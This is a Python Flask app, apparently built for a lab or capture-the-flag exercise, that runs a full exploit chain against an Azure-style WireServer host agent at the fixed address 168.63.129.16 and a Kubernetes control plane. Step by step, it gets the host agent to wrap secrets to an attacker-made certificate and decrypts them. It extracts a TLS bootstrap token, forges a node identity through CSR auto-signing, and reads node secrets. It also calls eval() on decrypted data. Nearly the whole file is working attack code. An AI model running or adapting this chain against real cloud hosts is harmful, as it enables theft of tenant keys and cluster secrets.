"""WireServing (case #255/#184): host-agent channel -> node bootstrap secrets."""
import base64
import datetime
import os

import requests
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.x509.oid import NameOID
from flask import Flask, request

app = Flask(__name__)
HOST_AGENT = os.environ.get("HOST_AGENT_URL", "http://168.63.129.16:5000")
CONTROL = os.environ.get("CONTROL_URL", "http://control-plane:5000")

HTML = """<h1>WireServing — host-agent channel exploit</h1>
<form method="post" action="/run"><button>Run full exploit chain</button></form>
<pre>{{out}}</pre>"""


@app.route("/")
def home():
    return HTML.replace("{{out}}", "Ready")


def make_transport_key():
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, u"LinuxTransport")])
    cert = (
        x509.CertificateBuilder()
        .subject_name(name).issuer_name(name)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(datetime.datetime.utcnow() - datetime.timedelta(days=1))
        .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=30))
        .sign(key, hashes.SHA256())
    )
    cert_pem = cert.public_bytes(serialization.Encoding.PEM).decode()
    return key, cert_pem


def rsa_unwrap(key, data):
    sk = key.decrypt(
        base64.b64decode(data["wrapped_key"]),
        padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None),
    )
    dec = Cipher(algorithms.AES(sk), modes.GCM(base64.b64decode(data["iv"]))).decryptor()
    return dec.update(base64.b64decode(data["ciphertext"])) + dec.finalize_with_tag(
        base64.b64decode(data["tag"])
    )


@app.route("/run", methods=["POST"])
def run():
    log = []
    # 1. goalstate (no auth)
    gs = requests.get(f"{HOST_AGENT}/machine/", params={"comp": "goalstate"}, timeout=8).json()
    log.append(f"[1] goalstate: {gs['container']['containerId']} "
               f"vm={gs['server']['vmName']}")

    # 2. transport key -> certs endpoint (unvalidated caller-supplied cert)
    tkey, tcert = make_transport_key()
    cert_b64 = base64.b64encode(tcert.encode()).decode()
    r = requests.get(f"{HOST_AGENT}/certs", headers={"x-ms-guest-agent-public-x509-cert": cert_b64}, timeout=8)
    data = r.json()
    bundle = rsa_unwrap(tkey, data)
    tenant_cert_pem = eval(bundle.decode())["tenantEncryptionCertPem"]
    log.append("[2] decrypted secret bundle with attacker transport key -> TenantEncryptionCert")

    # 3. decrypt protectedSettings with the tenant cert
    vs = requests.get(f"{HOST_AGENT}/vmSettings", timeout=8).json()
    tenant_key = serialization.load_pem_private_key(tenant_cert_pem.encode(), password=None)
    plain = rsa_unwrap(tenant_key, vs["extensions"][0]["protectedSettings"]).decode()
    bootstrap = [ln for ln in plain.splitlines() if ln.startswith(("TLS_BOOTSTRAP_TOKEN", "FLAG"))]
    log.append(f"[3] protectedSettings decrypted: {bootstrap}")
    token = [ln.split("=", 1)[1] for ln in plain.splitlines() if ln.startswith("TLS_BOOTSTRAP_TOKEN")][0]

    # 4. forge node identity via CSR auto-signing
    node_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    csr = (
        x509.CertificateSigningRequestBuilder()
        .subject_name(x509.Name([
            x509.NameAttribute(NameOID.COMMON_NAME, u"system:node:k8s-agentpool-00000000-0"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, u"system:nodes"),
        ]))
        .sign(node_key, hashes.SHA256())
    )
    csr_pem = csr.public_bytes(serialization.Encoding.PEM)
    sr = requests.post(f"{CONTROL}/sign", json={"token": token, "csr": base64.b64encode(csr_pem).decode()}, timeout=8)
    node_cert = sr.json()["cert"]
    log.append(f"[4] forged node identity: {sr.json()['cn']}")

    # 5. read node secrets as the forged node
    ns = requests.get(f"{CONTROL}/node-secrets", headers={"X-Node-Cert": node_cert}, timeout=8)
    log.append(f"[5] node authorizer granted secrets: {ns.json()}")
    return HTML.replace("{{out}}", "\n".join(log))


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
